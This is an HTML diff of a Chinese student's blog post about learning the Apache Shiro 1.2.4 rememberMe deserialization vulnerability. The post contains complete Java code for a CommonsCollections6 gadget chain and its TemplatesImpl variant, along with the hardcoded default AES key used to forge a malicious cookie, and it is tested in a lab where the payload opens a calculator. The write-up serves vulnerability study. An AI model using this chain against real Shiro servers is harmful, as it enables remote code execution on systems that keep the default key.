@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">pyshare&#39;s blog</title>
+  <title itemprop="name">Shiro反序列化漏洞学习 | pyshare&#39;s blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -372,515 +372,333 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      Shiro反序列化漏洞学习</h1>
+      <p class="entry-census">
+        <span>
+          <a href="york145.github.io/">
+            <img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="york145.github.io/">xiaotan</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-6-13<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">每天进步一点点 QQ：2192557290</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/categories/Java/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/startdash/bilibili.jpg">
-        </div>
-        <div class="info">
-          <h3>Java</h3>
-          <p>Java</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/categories/内网/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/startdash/g85kqe.png">
-        </div>
-        <div class="info">
-          <h3>内网</h3>
-          <p>内网</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/startdash/sakura.md.png">
-        </div>
-        <div class="info">
-          <h3>xiaotan的万事屋</h3>
-          <p>技术服务</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-</div>
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="Shiro反序列化漏洞学习"><a href="#Shiro反序列化漏洞学习" class="headerlink" title="Shiro反序列化漏洞学习"></a>Shiro反序列化漏洞学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近临近期末，事情变得很多，到了大二后感觉事情明显变多了，感觉人也很累，已经很久没有更新文章了，记得刚刚开始写博客是大一的时候，刚刚开始写博客也只是瞎搞，慢慢的开始注意到自己不能继续下去，于是就删除了以前的文章。尽管现在的文章质量也还是很低，但是希望自己能够慢慢进步。最近不仅要忙期末考试的事情、还要写项目，开始写项目发现自己的代码功底还是很弱，希望能在大三中改善这点。</p>
+<h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p>
+<p>Shiro能到底能做些什么呢？</p>
+<ul>
+<li>验证用户身份</li>
+<li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li>
+<li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li>
+<li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li>
+<li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li>
+<li>支持单点登录(SSO)功能</li>
+<li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li>
+</ul>
+<p>具体的就自己去了解吧。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里用的是<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo/">p牛的代码</a>,其实刚刚开始打算自己写的，但是弄了好久都一直有一个报错，看了看版本，网上的资料，也没找到原因,报错如下。最后用p牛的代码先学一下，希望以后能够解决这个问题。</p>
+<pre><code>Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [org.apache.commons.collections.keyvalue.TiedMapEntry: static final long serialVersionUID = -8453869361373831205L;]: 
+    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:55) ~[shiro-core-1.2.4.jar:1.2.4]
+    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1984) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1848) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2158) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]
+    at java.util.HashMap.readObject(HashMap.java:1410) ~[na:1.8.0_281]
+    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_281]
+    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_281]
+    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_281]
+    at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_281]
+    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1185) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2294) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2185) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]
+    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]
+    at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77) ~[shiro-core-1.2.4.jar:1.2.4]
+    ... 28 common frames omitted
+Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.keyvalue.TiedMapEntry] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.
+    at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) ~[shiro-core-1.2.4.jar:1.2.4]
+    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) ~[shiro-core-1.2.4.jar:1.2.4]
+    ... 46 common frames omitted</code></pre><h2 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h2><p>这里用的是cc6的原因也是因为看了p牛的文章，想自己脱离文章试一下。</p>
+<p>先改写一下cc6生成payload,cc6.java改的很简单只是使原来的方法改写成返回字节数组的函数，然后再编写一个test.java将返回的字节码利用shiro 1.2.4内置的密钥进行加密，生成命令执行的rememberMe。</p>
+<h3 id="cc6-java"><a href="#cc6-java" class="headerlink" title="cc6.java"></a>cc6.java</h3><pre><code class="java">import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class cc6 &#123;
+
+    public byte[] getPayload(String command) throws Exception &#123;
+
+        Transformer Testtransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);
+
+        Transformer[] transformers=new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[]&#123;&#125;&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe &quot;&#125;)
+        &#125;;
+
+        Map map=new HashMap();
+        Map lazyMap=LazyMap.decorate(map,Testtransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);
+
+        HashSet hashSet=new HashSet(1);
+        hashSet.add(tiedMapEntry);
+        lazyMap.remove(&quot;test1&quot;);
+
+        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
+        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(Testtransformer, transformers);
+
+//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));
+//        objectOutputStream.writeObject(hashSet);
+//        objectOutputStream.close();
+//
+//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));
+//        objectInputStream.readObject();
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(stream);
+        objectOutputStream.writeObject(hashSet);
+        objectOutputStream.close();
+
+        return stream.toByteArray();
+    &#125;
+&#125;</code></pre>
+<h3 id="test-java"><a href="#test-java" class="headerlink" title="test.java"></a>test.java</h3><pre><code class="java">import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+public class test &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] payload = new cc6().getPayload(&quot;calc.exe&quot;);
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payload, key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+&#125;</code></pre>
+<p>将生成的rememberMe去访问login.jsp的页面，如图：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp5mdurzj30od0k5wj5.jpg" alt=""></p>
+<p>但是并没有弹出计算器，查看idea的报错：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7qh1s8j318v09874s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7vcb17j318s034weg.jpg" alt=""></p>
+<p>我们查看一下报错的内容，好像是和类没有加载成功有关[Lorg.apache.commons.collections.Transformer;，而这个类就是我们cc6里面用到的Transformer，但是为什么会报错呢，还有这个最前面多余的[L是什么意思？</p>
+<p>我们先来回答第二个问题，这个符号表示的是这是一个数组，即Transformer[]。那么为什么这个类无法加载呢？我们debug进去看一下。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpoiwtn6j312s073q3v.jpg" alt=""></p>
+<p>可以看见这里重写了resolve方法，我们先比较一下与原来有什么不同</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpvb0lvlj31bh0n4gmm.jpg" alt=""></p>
+<p>在ClassResolvingObjectInputStream.resolveClass中，不同之处就在与父类使用的是Class.forname()而在后者使用的则是org.apache.shiro.util.ClassUtils.forname(),为了知道有什么具体的不同我们跟进进行观察。</p>
+<p>进入ClassUtils.forname()后我们可以发现其实内部调用的是Class.loadClass()这个方法。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpz8uczjj30uh0djmyy.jpg" alt=""></p>
+<p>在一般情况下Class.forname和Class.loadClass()的效果是相同的，但是loadClass的方法不能加载数组，继续往loadClass里面跟进会调用Class.forName,再继续追就是双亲委派了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqjp3xhbj30uh0djmyy.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqju3vz0j30jo06emxq.jpg" alt=""></p>
+<p>在整体流程里面，WebappsClassLoader会先寻找内部缓存，寻找类，找不到交给URLClasssLoader但是寻找的却是/[Lorg而不是/org打头所以没有找到。</p>
+<p>那么现在找到了原因，cc6中不能使用数组，可是不能使用Transformer的数组岂不是凉了吗，可是p牛还是相处了解决方案。而这个解决方案为之前的fastjson的文章也利用到过，就是使用TemplatesImpl来执行命令。</p>
+<h2 id="修改cc6利用链"><a href="#修改cc6利用链" class="headerlink" title="修改cc6利用链"></a>修改cc6利用链</h2><p>接下来我们先写一个TemplatesImpl：</p>
+<blockquote>
+<p>TemplatesImpl templates = new TemplatesImpl();<br>            setvalue(templates, “_bytecodes”, new byte[][]{clazzBytes});<br>            setvalue(templates, “_name”, “HelloTemplatesImpl”);<br>            setvalue(templates, “_tfactory”, new TransformerFactoryImpl());</p>
+</blockquote>
+<p>这个我们之前<a target="_blank" rel="noopener" href="https://www.yuque.com/pyshare-xiaotan/gc6e3o/tbmrhp#dlHvI">fastjson</a>的时候有写到过。</p>
+<pre><code class="java">public static byte[] generateEvil() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clas = pool.makeClass(&quot;Evil&quot;);
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;
+        clas.makeClassInitializer().insertBefore(cmd);
+        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));
+
+        clas.writeFile(&quot;./&quot;);
+
+        byte[] bytes = clas.toBytecode();
+        return bytes;
+    &#125;
+        public static void main(String[] args) throws Exception &#123;
+
+            byte[] clazzBytes = generateEvil();
+            TemplatesImpl templates = new TemplatesImpl();
+            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);
+            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+            templates.newTransformer();
+        &#125;
+    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj,value);
+    &#125;</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgkukjfatj31c10u016f.jpg" alt=""></p>
+<p>确实可以触发命令执行，那我们在转回去结合cc6看看，如何结合起来。</p>
+<blockquote>
+<p>Transformer[] transformer = new Transformer[]{<br>                new ConstantTransformer(templates),<br>                    new InvokerTransformer(“newTransformer”, null,null)<br>            };</p>
+</blockquote>
+<p>这里的ConstantTransformer会返回对象，然后调用nerTransformer方法，实际上就是原来的templates.newTransformer()。但是这里还是用到了数组，我们现在要想办法代替掉这个步骤。</p>
+<p>我们再转回去看看cc6的代码，其中有这段：</p>
+<pre><code> Map map=new HashMap();
+        Map lazyMap=LazyMap.decorate(map,Testtransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);
+        HashSet hashSet=new HashSet(1);
+        hashSet.add(tiedMapEntry);
+        lazyMap.remove(&quot;test1&quot;);</code></pre><p>在LazyMap#get的方法中存在this.factory.transform(key)的方法，那我们只要控制这里的key为我们设置的templatesImpl，控制this.factory为invokeTransfomer就可以执行命令了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgm6o80ioj30vu0tsamt.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmupoi3sj311406wwfu.jpg" alt=""></p>
+<p>下面接下来的就和cc6一样了，我们控制TideMapEntry中的map为LazyMap就可以了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmwr006oj311e0sm7ac.jpg" alt=""></p>
+<p>现在利用链已经构造好了，完整代码如下：</p>
+<pre><code>public static byte[] generateEvil() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clas = pool.makeClass(&quot;Evil&quot;);
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;
+        clas.makeClassInitializer().insertBefore(cmd);
+        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));
+
+        clas.writeFile(&quot;./&quot;);
+
+        byte[] bytes = clas.toBytecode();
+        return bytes;
+    &#125;
+        public static void main(String[] args) throws Exception &#123;
+
+            byte[] clazzBytes = generateEvil();
+            TemplatesImpl templates = new TemplatesImpl();
+            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);
+            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+            InvokerTransformer transformer = new InvokerTransformer(&quot;getClass&quot;,null, null);
+
+            Map map=new HashMap();
+            Map lazyMap= LazyMap.decorate(map,transformer);
+            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);
+
+            HashSet hashSet=new HashSet(1);
+            hashSet.add(tiedMapEntry);
+            lazyMap.clear();
+
+            setvalue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));
+            objectOutputStream.writeObject(hashSet);
+            objectOutputStream.close();
+
+            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));
+            objectInputStream.readObject();
+
+        &#125;
+    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj,value);
+    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgoobc3g6j31kx0u0hdt.jpg" alt=""><br>下面是debug执行命令的具体地方<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgp36981qj310v0u0dwj.jpg" alt=""><br>但是这里可以注意到cc6原来使用的是remove那为什么我们这里使用的却是clear呢？<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgomjwdaxj31ce0pogsf.jpg" alt=""></p>
+<p>其实是可以的只是我学太久了，脑子不太灵光了，哈哈。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtukcu7cj30l80a6gpw.jpg" alt=""><br>这样写是可以弹出来的，原来的remove健写错了导致命令执行出现了错误。感兴趣可以自己debug看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtvprfz1j31hw0a6dpc.jpg" alt=""></p>
+<p>最后再自己修改一下代码，这里我就不贴了。最后我的环境搭在windows上我mac是m1有点小问题，不过也成功弹出计算器了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grguew3s6lj313j0ljte8.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次脱离文章自己写东西，以前都是一边看一边写的，感觉收获还是蛮大的，临近期末，事情也越来越多，争取每天都能学到新的东西。</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                Java agent学习</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-13 19:06</div>
-      <a href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="post-title">
-        <h3>Shiro反序列化漏洞学习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-            <a href="/tags/web/">web<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Shiro反序列化漏洞学习</p>
-        <div class="post-bottom">
-          <a href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="york145.github.io/" class="profile gravatar"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg" itemprop="image" alt="xiaotan" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="york145.github.io/" itemprop="url" rel="author">xiaotan</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-5-9 14:05</div>
-      <a href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" class="post-title">
-        <h3>Java agent学习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/Java/">Java<em>·</em></a>
-          
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E5%86%85%E7%BD%91/">内网</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008i3skNly1gq0wmy7qiej31hc0u0dom.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-29 20:04</div>
-      <a href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" class="post-title">
-        <h3>内网渗透--远程桌面</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-            <a href="/tags/%E5%86%85%E7%BD%91/">内网<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E5%86%85%E7%BD%91/">内网</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>内网</p>
-        <div class="post-bottom">
-          <a href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-18 18:04</div>
-      <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" class="post-title">
-        <h3>内存马初探</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/Java/">Java<em>·</em></a>
-          
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
